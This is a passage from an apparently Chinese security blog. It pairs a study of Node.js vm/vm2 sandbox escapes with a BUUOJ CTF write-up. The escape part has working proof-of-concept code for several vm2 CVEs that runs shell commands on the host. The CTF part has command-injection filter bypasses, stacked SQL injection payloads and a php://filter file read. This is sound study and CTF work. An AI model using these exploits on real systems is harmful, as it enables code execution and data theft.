(cc.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>))(); </span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> p.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-title function_">toString</span>() </span><br><span class="language-javascript">    &#125;  </span><br><span class="language-javascript">    &#125;) </span>`;<br><span class="hljs-keyword">try</span> &#123; vm.runInContext(script, vm.createContext(<span class="hljs-built_in">Object</span>.create(<span class="hljs-literal">null</span>))); &#125;<br><span class="hljs-keyword">catch</span> (e) &#123; console.log(<span class="hljs-string">&#x27;error happend: &#x27;</span> + e); &#125;<br></code></pre></td></tr></table></figure><p>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。</p><h2 id="vm2沙箱逃逸"><a href="#vm2沙箱逃逸" class="headerlink" title="vm2沙箱逃逸"></a>vm2沙箱逃逸</h2><h3 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h3><p>通过上面几个例子可以看出来vm沙箱隔离功能较弱，有很多逃逸的方法，所以第三方包vm2在vm的基础上做了一些优化</p><p>我们这里可以安装vm2包</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">npm <span class="hljs-keyword">install</span> vm2<br></code></pre></td></tr></table></figure><p>vm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了，所以我这里也找不到对应的资源了，代码分析也比较麻烦，直接移步链接：</p><p><a href="https://www.anquanke.com/post/id/207283#h2-1">vm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>这里我们就不进行分析了，直接给出漏洞及利用方式</p><h3 id="CVE-2019-10761"><a href="#CVE-2019-10761" class="headerlink" title="CVE-2019-10761"></a><strong>CVE-2019-10761</strong></h3><p>该漏洞要求vm2版本&lt;&#x3D;3.6.10</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-string">&quot;use strict&quot;</span>;<br>const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm2&#x27;</span>);<br>const untrusted = `<span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">const</span> f = <span class="hljs-title class_">Buffer</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">write</span>;</span><br><span class="language-javascript"><span class="hljs-keyword">const</span> ft = &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">length</span>: <span class="hljs-number">10</span>,</span><br><span class="language-javascript">        <span class="hljs-title function_">utf8Write</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">r</span>(<span class="hljs-params">i</span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> x = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript">        x = <span class="hljs-title function_">r</span>(i);</span><br><span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(e)&#123;&#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">typeof</span>(x)!==<span class="hljs-string">&#x27;number&#x27;</span>)</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> x;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(x!==i)</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> x+<span class="hljs-number">1</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript">        f.<span class="hljs-title function_">call</span>(ft);</span><br><span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(e)&#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> e;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-keyword">var</span> i=<span class="hljs-number">1</span>;</span><br><span class="language-javascript"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">try</span>&#123;</span><br><span class="language-javascript">        i=<span class="hljs-title function_">r</span>(i).<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process&quot;</span></span>)(<span class="hljs-params"></span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">break</span>;</span><br><span class="language-javascript">    &#125;<span class="hljs-keyword">catch</span>(x)&#123;</span><br><span class="language-javascript">        i++;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript">i.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>()</span><br><span class="language-javascript"></span>`;<br><span class="hljs-keyword">try</span>&#123;<br>    console.log(<span class="hljs-keyword">new</span> VM().run(untrusted));<br>&#125;<span class="hljs-keyword">catch</span>(x)&#123;<br>    console.log(x);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个链子在p牛的知识星球上有，很抽象，沙箱逃逸说到底就是要从沙箱外获取一个对象，然后获得这个对象的constructor属性。</p><p>这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象。</p><p>举个例子：</p><p>假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-attribute">r</span>(i);      <span class="hljs-comment">// 该函数递归999次</span><br>f<span class="hljs-selector-class">.call</span>(ft);    <span class="hljs-comment">// 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数</span><br>this<span class="hljs-selector-class">.utf8Write</span>()   <span class="hljs-comment">// 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱外的异常对象</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132249391.png" alt="img"></p><h3 id="CVE-2021-23449"><a href="#CVE-2021-23449" class="headerlink" title="CVE-2021-23449"></a><strong>CVE-2021-23449</strong></h3><p>这个漏洞在snyk解释是原型链污染导致的沙箱逃逸，但p牛在知识星球里发了其实是另外的原因</p><p><a href="https://security.snyk.io/vuln/SNYK-JS-VM2-1585918">Sandbox Bypass in vm2 | CVE-2021-23449 | Snyk</a></p><p>poc：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> res = <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./foo.js&#x27;</span>)<br>res.<span class="hljs-property">toString</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return this&quot;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>();<br></code></pre></td></tr></table></figure><p>import()在JavaScript中是一个语法结构，不是函数，没法通过之前对require这种函数处理相同的方法来处理它，导致实际上我们调用import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正则匹配并替换了<code>\bimport\b</code>关键字，在编译失败的时候，报Dynamic Import not supported错误。</p><h3 id="知识星球上的另外一个trick"><a href="#知识星球上的另外一个trick" class="headerlink" title="知识星球上的另外一个trick"></a><strong>知识星球上的另外一个trick</strong></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Symbol</span> = &#123;<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">toStringTag</span>()&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span>f.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process&quot;</span></span>)(<span class="hljs-params"></span>)<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">try</span>&#123;<br>  <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());<br>&#125;<span class="hljs-keyword">catch</span>(f)&#123;<br>  <span class="hljs-title class_">Symbol</span> = &#123;&#125;;<br>  <span class="hljs-title function_">f</span>(<span class="hljs-function">()=&gt;</span>&#123;&#125;).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;whoami&quot;</span>).<span class="hljs-title function_">toString</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>在vm2的原理中提到vm2会为对象配置代理并初始化，如果对象是以下类型：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132249954.png" alt="img"></p><p>就会return <code>Decontextify.instance</code> 函数，这个函数中用到了Symbol全局对象，我们可以通过劫持Symbol对象的getter并抛出异常，再在沙箱内拿到这个异常对象就可以了</p><h3 id="其他CVE"><a href="#其他CVE" class="headerlink" title="其他CVE"></a>其他CVE</h3><p>多名安全研究人员先后发现了VM2中的多个沙箱逃逸漏洞，分别是Seongil Wi发现的CVE-2023-29017漏洞和SeungHyun Lee发现的CVE-2023-29199、CVE-2023-30547漏洞。攻击者利用这些漏洞可以绕过沙箱环境的限制运行恶意代码。CVE-2023-29017漏洞影响vm2 3.9.14之前版本，VM2已在3.9.15版本中修复了该漏洞。</p><p>这里提一下CVE-2023-30547</p><p>CVE-2023-30547漏洞是由来自韩国科学技术院（KAIST）的SeungHyun Lee发现的，该漏洞属于异常处理漏洞，允许攻击者在handleException()内引发未处理的主机异常，CVSS评分9.8分。</p><p>handleException()函数负责处理沙箱中的异常以预防主机信息泄露。但如果攻击者设置一个定制的getPrototypeOf()代理处理器来抛出未处理的主机异常，handleException()函数就无法处理该异常。那么攻击者就可以访问主机函数，即绕过沙箱的限制实现逃逸，并可以在主机环境内执行任意代码。</p><p>vm2 在 3.9.16 版本及以下存在一个漏洞，攻击者可以在 <code>handleException()</code> 中触发未处理的宿主异常，从而逃逸沙盒并在宿主上下文中执行任意代码。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">const &#123;VM&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);<br>const vm = <span class="hljs-keyword">new</span> VM();<br><br>const code = `<span class="language-javascript"></span><br><span class="language-javascript">err = &#123;&#125;;</span><br><span class="language-javascript"><span class="hljs-keyword">const</span> handler = &#123;</span><br><span class="language-javascript">    <span class="hljs-title function_">getPrototypeOf</span>(<span class="hljs-params">target</span>) &#123;</span><br><span class="language-javascript">        (<span class="hljs-keyword">function</span> <span class="hljs-title function_">stack</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>().<span class="hljs-property">stack</span>;</span><br><span class="language-javascript">            <span class="hljs-title function_">stack</span>();</span><br><span class="language-javascript">        &#125;)();</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;;</span><br><span class="language-javascript">  </span><br><span class="language-javascript"><span class="hljs-keyword">const</span> proxiedErr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(err, handler);</span><br><span class="language-javascript"><span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">throw</span> proxiedErr;</span><br><span class="language-javascript">&#125; <span class="hljs-keyword">catch</span> (&#123;<span class="hljs-attr">constructor</span>: c&#125;) &#123;</span><br><span class="language-javascript">    c.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;return process&#x27;</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;touch pwned&#x27;</span>);</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span>`<br><br>console.log(vm.run(code));<br></code></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://blog.csdn.net/m0_73512445/article/details/133970916">NodeJS VM沙箱逃逸_let sandbox &#x3D; object.create(null); let context &#x3D; v-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_68163788/article/details/134320028">Nodejs沙箱绕过_nodesandbox-CSDN博客</a></p><p><a href="https://xz.aliyun.com/news/11305">NodeJS VM和VM2沙箱逃逸-先知社区</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/16899212.html">nodejs vm&#x2F;vm2沙箱逃逸分析 - zpchcbd - 博客园</a></p><p><a href="https://www.4hou.com/posts/m0wp">vm2再爆沙箱逃逸漏洞 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p><p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16 · GitHub --- Sandbox Escape in vm2@3.9.16 · GitHub</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuoj WP1</title>
    <link href="/2025/07/13/Buuoj_WP1/"/>
    <url>/2025/07/13/Buuoj_WP1/</url>
    
    <content type="html"><![CDATA[<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>命令执行漏洞</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312119720.png" alt="image-20250331211912616"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312119677.png" alt="image-20250331211943612"></p><p>过滤空格</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312120110.png" alt="image-20250331212011067"></p><p>这里我们找到RCE的过滤空格，然后不断尝试（还没尝试完就放弃了，不应该）</p><p>然后用<code>$IFS</code>绕过空格，发现过滤<code>flag</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312122663.png" alt="image-20250331212220624"></p><p>然后用拼接法绕过，过程中发现<code>$IFS</code>影响命令执行，改为<code>$IFS$9</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312123992.png" alt="image-20250331212353283"></p><p>这种一般带着<code>&lt;?php</code>，需要查看源代码</p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312127003.png" alt="image-20250331212701956"></p><p>还可以内联执行</p><p>内联函数：将指定的函数体插入并取代每一处调用该函数的地方。</p><p>反引号在linux中作为内联执行，执行输出结果。也就是说</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>` //执行<span class="hljs-built_in">ls</span>输出index.php和flag.php,然后再执行<span class="hljs-built_in">cat</span> flag.php;<span class="hljs-built_in">cat</span> index.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312129280.png" alt="image-20250331212949091"></p><p>sh命令来执行</p><p>使用 base64 编码的方式来绕过 flag 过滤。</p><p>加密命令<code>echo “cat flag.php” | base64</code>；</p><p>解密命令并执行<code>echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</code></p><p>然后用<code>$IFS$9</code>代替空格。</p><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>一进来就要找秘密</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022117798.png" alt="image-20250402211745650"></p><p>看人名也没啥谐音，估计是恶搞，暂时没啥有用的</p><p>右键查看源代码</p><p>发现<code>/Archive_room.php</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022119924.png" alt="image-20250402211928840"></p><p>进去以后是秘密</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022120157.png" alt="image-20250402212025497"></p><p>点开后跳转到<code>/end.php</code>，然后显示没看清么？回去再仔细看看吧。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022121250.png" alt="image-20250402212122119"></p><p>这里查看<code>/Archive_room.php</code>的源代码，</p><p>发现查看秘密应该跳到<code>/action.php</code>，但是我们却跳转到<code>/end.php</code>，应该是302跳转</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022123535.png" alt="image-20250402212321480"></p><p>所以我们这里用curl访问（curl默认不跟随重定向，bp也可以做到）</p><p>让我们访问<code>secr3t.php</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022126835.png" alt="image-20250402212611770"></p><p>进去后提示去<code>/flag.php</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022127752.png" alt="image-20250402212723694"></p><p>访问<code>/flag.php</code>后，不显示flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022128613.png" alt="image-20250402212806573"></p><p>找到了但是看不到，此时又想到了PHP的封装协议，我们用一下 [ACTF2020 新生赛]Include里面使用的方法</p><p>构造payload: <code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code></p><p>解码，出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022130945.png" alt="image-20250402213021891"></p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>可以查数据，加单引号会有报错</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030948144.png" alt="image-20250403094810030"></p><p><code>1&#39; union select 1#</code></p><p>出现过滤，而且是大小写不敏感的，union注入不好使了。</p><p>实际上我们还有报错，但是因为过滤，常规报错注入也不好使</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030846726.png" alt="image-20250403084647325"></p><p>和[SUCTF 2019]EasySQL一样，这里竟然用堆叠注入，这是我没想到的，一直以为堆叠注入不会考</p><p>实际上堆叠注入没那么简单，也可以考的挺难</p><p>这里用<code>show</code>来代替<code>select</code></p><p>先通过show databases爆出数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span><span class="hljs-string">&#x27;; show databases; #</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030857579.png" alt="image-20250403085725310"></p><p>然后用 show tables 尝试爆表。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span><span class="hljs-string">&#x27;; show tables; #</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030857176.png" alt="image-20250403085754975"></p><p>可以看到这里有两个表，我们先尝试爆words表的内容。</p><p>实际上，这里本来就是查的words表的内容，</p><p>也就是我们输入<code>1</code>就是查的words表中<code>id</code>为1的<code>data</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span><span class="hljs-string">&#x27;; show columns from words; #</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030901747.png" alt="image-20250403090146566"></p><p>然后爆表 1919810931114514 的内容。</p><p>这里学到一个新知识点，表名为数字时，要用反引号包起来查询。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span><span class="hljs-string">&#x27;; show columns from `1919810931114514`; #</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030903703.png" alt="image-20250403090315538"></p><p>可以发现爆出来了flag字段，然而因为过滤，常规方法对于flag毫无办法</p><p>这里有三个思路</p><p>第一个，</p><ol><li><p>通过 rename 先把 words 表改名为其他的表名(word1)。</p></li><li><p>把 1919810931114514 表的名字改为 words 。</p></li><li><p>给新 words 表添加新的列名 id 。</p></li><li><p>将 flag 改名为 data 。</p></li></ol><p>之所以这么做，因为这里我们默认查的是words表，所以我们把1919810931114514 表改的像words 表，这样输入1就可以出flag了</p><pre><code class="hljs">1&#39;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</code></pre><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030915097.png" alt="image-20250403091459926"></p><p>第二个，</p><p>因为select被过滤了，所以先将</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-symbol">`1919810931114514`</span><br></code></pre></td></tr></table></figure><p>进行16进制编码</p><p>再通过构造payload得</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;SeT@a=0x<span class="hljs-number">7365</span>6c<span class="hljs-number">65637420</span>2a<span class="hljs-number">206672</span>6f6d<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;prepare execsql from @a;execute execsql;#<br></code></pre></td></tr></table></figure><p>进而得到flag</p><pre><code class="hljs">prepare…from…是预处理语句，会进行编码转换。execute用来执行由SQLPrepare创建的SQL语句。SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。</code></pre><p>这里由于我将 1919810931114514 表的名字改为 words ，所以我应该用</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select * <span class="hljs-keyword">from</span> <span class="hljs-built_in">words</span><br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;SeT@a=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">2077</span>6F<span class="hljs-number">726473</span>;prepare execsql from @a;execute execsql;#<br></code></pre></td></tr></table></figure><p>这里我们既查了1，又有16进制的payload，所以出现两个flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030921262.png" alt="image-20250403092147057"></p><p>第三个，</p><p>使用MySQL特有的<code>HANDLER</code>命令来直接访问表数据，绕过常规的SELECT查询。</p><p><strong>HANDLER命令详解</strong></p><p><code>HANDLER</code>命令提供了一种比SELECT更直接的访问表数据的方式：</p><ul><li>不需要完整的SQL解析</li><li>性能更高</li><li>但功能有限，主要用于顺序扫描表</li></ul><p>常见HANDLER操作：</p><ol><li><code>HANDLER tbl_name OPEN</code> - 打开表</li><li><code>HANDLER tbl_name READ FIRST</code> - 读取第一行</li><li><code>HANDLER tbl_name READ NEXT</code> - 读取下一行</li><li><code>HANDLER tbl_name CLOSE</code> - 关闭表</li></ol><p>下面是举例payload1（这是<code>[GYCTF2020]Blacklist</code>的payload）</p><pre><code class="hljs">1&#39;; handler `FlagHere` open as `a`; handler `a` read next;#</code></pre><p>payload1解释如下</p><p>第一个操作：handler  `FlagHere` open as `a`</p><ul><li><code>HANDLER</code>是MySQL特有的低级表访问接口</li><li>语法：<code>HANDLER table_name OPEN [AS alias]</code></li><li>这里打开名为<code>FlagHere</code>的表，并赋予别名<code>a</code></li><li>反引号(&#96;&#96;)用于包裹表名，防止特殊字符引起问题</li></ul><p>第二个操作：handler `a` read next</p><ul><li>使用之前打开的handler别名<code>a</code></li><li><code>READ NEXT</code>从表中读取下一行数据</li><li>这会返回表中的第一行内容(因为这是第一次调用)</li></ul><p>还有payload2，都大同小异了</p><pre><code class="hljs">1&#39;;HANDLER FlagHere OPEN; HANDLER FlagHere READ FIRST; HANDLER FlagHere CLOSE;#</code></pre><p>payload2解释如下</p><p>第一个操作：<code>HANDLER FlagHere OPEN</code></p><ul><li>打开名为<code>FlagHere</code>的表</li><li>与前一条不同，这里没有使用反引号包裹表名，也没有设置别名</li></ul><p>第二个操作：<code>HANDLER FlagHere READ FIRST</code></p><ul><li>读取<code>FlagHere</code>表的第一行数据</li><li>前一条使用的是<code>READ NEXT</code>，这里使用<code>READ FIRST</code>更明确地表示要读取第一行</li></ul><p>第三个操作：<code>HANDLER FlagHere CLOSE</code></p><ul><li>显式关闭之前打开的表</li><li>这是与前一条不同的新增操作，确保handler被正确关闭</li></ul><p>这道题的payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></code></pre></td></tr></table></figure><p>因为改表名了，所以改为</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">1</span>&#x27;; handler `words` <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> `a`; handler `a` read next;#<br></code></pre></td></tr></table></figure><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>传个一句话木马试试</p><p>显示不是图片</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022151079.png" alt="image-20250402215143008"></p><p>MIME绕过</p><p>显示php后缀不行</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022153399.png" alt="image-20250402215257575"></p><p>改成php5试试，也不行</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022154077.png" alt="image-20250402215409018"></p><p>但phtml行，<strong>[ACTF2020 